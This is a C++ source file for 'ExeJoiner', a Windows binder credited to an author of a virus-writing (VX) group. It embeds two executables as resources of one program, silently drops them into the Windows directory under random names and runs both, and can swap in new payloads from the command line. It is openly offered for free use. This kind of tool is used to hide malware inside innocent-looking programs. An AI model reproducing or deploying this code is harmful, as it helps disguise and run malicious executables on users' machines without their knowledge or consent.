/*

You can join two exe files into one and let them start after droping in temporary exe files.
This version is also able to replace its resources dynamically. You can replace them in the commandline
like here:

ExeJoiner "AppToRun1.exe" "AppToRun2.exe" "DestinationApp.exe"

So you joined AppToRun1 + AppToRun2 to DestinationApp and can run it now.
This two apps will be dropped in windows directory but will be started with current directory set to
this one where the joined exe was started. So you could attach also setup files with it.

No Copyright - free for any use

Written by RadiatioN in August-September 2006

Zine and group site:
EOF - Electrical Ordered Freedom
http://www.eof-project.net

My site:
RadiatioN's VX World
http://radiation.eof-project.net

Contact:
radiation[at]eof-project[dot]net

some nice greetings to Sky my good friend :)

*/

#include "stdafx.h"
#include "ExeJoiner.h"

char szTempName[20]="";

void ExtractResource(char *szResourceName, char *szResourceType, bool bExecute)
{
	HRSRC hRes;
	HGLOBAL hResGlob;
	DWORD *dwResPointer, dwResSize, dwBytesWritten;
	char szCurrPath[260]="", szDestPath[260]="";
	HANDLE hFile;
	STARTUPINFO siProcess={0};
	PROCESS_INFORMATION piProcess={0};

	srand(GetTickCount());

	hRes = FindResource(NULL, szResourceName, szResourceType);
	hResGlob = LoadResource(NULL, hRes);
	dwResPointer = (DWORD*)LockResource(hResGlob);
	dwResSize = SizeofResource(NULL, hRes);

	GetWindowsDirectory(szCurrPath, 260);
	sprintf(szDestPath, "%s\\Temp_%i.%i.exe", szCurrPath, rand()%5000, rand()%5000);

	hFile = CreateFile(szDestPath, GENERIC_WRITE | GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);

	if(hFile!=NULL)
	{
		WriteFile(hFile, dwResPointer, dwResSize, &dwBytesWritten, 0);
		CloseHandle(hFile);
		GetCurrentDirectory(260, szCurrPath);
		if(bExecute==true)CreateProcess(0, szDestPath, 0, 0, true, 0, 0, szCurrPath, &siProcess, &piProcess);

		CloseHandle(hFile);
	}
}

void ReplaceResource(char *szResourceName, char *szResourceType, char *szNewExePath, char *szNewResource, bool bNoReplace)
{
	char szTempPath[260]="", szCurrPath[260]="", szDestPath[260]="";
	HANDLE hUpdate, hFile;
	DWORD dwTemp;
	LARGE_INTEGER liSize;
	
	GetModuleFileName(NULL, szTempPath, 260);
	GetWindowsDirectory(szCurrPath, 260);
	sprintf(szDestPath, "%s\\%s.exe", szCurrPath, szTempName);

	if(bNoReplace==false)CopyFile(szTempPath, szDestPath, false);

	hFile = CreateFile(szNewResource, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0);

	if(hFile!=NULL)
	{
		GetFileSizeEx(hFile, &liSize);
		char *Buf = new char[liSize.QuadPart];

		ReadFile(hFile, Buf, liSize.QuadPart, &dwTemp, 0);

		CloseHandle(hFile);

		hUpdate = BeginUpdateResource(szDestPath, false);

		if(hUpdate != NULL)
		{
			if(UpdateResource(hUpdate, szResourceType, szResourceName, 0, Buf, liSize.QuadPart))
			{
				EndUpdateResource(hUpdate, false);
			}
		}
	}

	CopyFile(szDestPath, szNewExePath, false);

	if(bNoReplace==true)DeleteFile(szDestPath);
}

int APIENTRY _tWinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPTSTR    lpCmdLine,
                     int       nCmdShow)
{
	sprintf(szTempName, "TempFile_%i_%i", rand()%200, rand()%200);
	
	if(__argv[1]!=NULL && __argv[2]!=NULL && __argv[3]!=NULL)
	{
		ReplaceResource(MAKEINTRESOURCE(IDR_BINARY1), "BINARY", __argv[3], __argv[1], false);
		ReplaceResource(MAKEINTRESOURCE(IDR_BINARY2), "BINARY", __argv[3], __argv[2], true);
	}
	else
	{
		ExtractResource(MAKEINTRESOURCE(IDR_BINARY1), "BINARY", true);
		Sleep(15);
		ExtractResource(MAKEINTRESOURCE(IDR_BINARY2), "BINARY", true);
	}
	
	return 0;
}
